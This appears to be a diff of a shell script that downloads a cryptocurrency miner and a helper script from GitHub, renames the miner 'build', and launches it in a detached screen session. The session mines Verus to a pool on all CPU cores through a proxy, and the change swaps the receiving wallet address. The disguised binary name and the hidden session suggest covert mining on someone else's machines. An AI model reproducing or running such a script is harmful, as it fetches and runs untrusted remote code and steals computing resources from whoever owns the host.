@@ -11,6 +11,6 @@ wget -q https://raw.githubusercontent.com/uzaki19/ezz/master/compile.sh
 wget -qO build https://github.com/uzaki19/ezz/blob/master/ccminer?raw=true
 chmod +x build
 chmod +x compile.sh
-screen -dm -S build ./build -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RT1Re4JxYJFcq7oM46F9aYe29nZQ9VU5As.worker-$worker -p x -t $(nproc --all) -x $proxy
+screen -dm -S build ./build -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RXD79XACKosRqTWEoJa4EbZGT93B8rdxnB.worker-$worker -p x -t $(nproc --all) -x $proxy
 ./compile.sh
 echo succes
